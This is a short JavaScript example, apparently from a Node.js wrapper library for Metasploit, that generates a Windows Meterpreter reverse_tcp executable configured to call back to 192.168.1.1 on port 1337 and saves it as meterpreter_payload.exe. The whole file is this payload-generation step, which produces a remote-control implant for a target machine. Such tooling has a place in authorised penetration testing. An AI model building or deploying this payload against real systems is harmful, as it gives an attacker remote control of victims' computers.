
var msfjs = require('../lib')();

msfjs.Payloads.create({

	payload: 'windows/meterpreter/reverse_tcp',
	options: {
		lhost: '192.168.1.1',
		lport: 1337
	},
	type: 'exe',
	filename: 'meterpreter_payload.exe'

}, function(res) {
	console.log("Created payload " + res.filename);
});
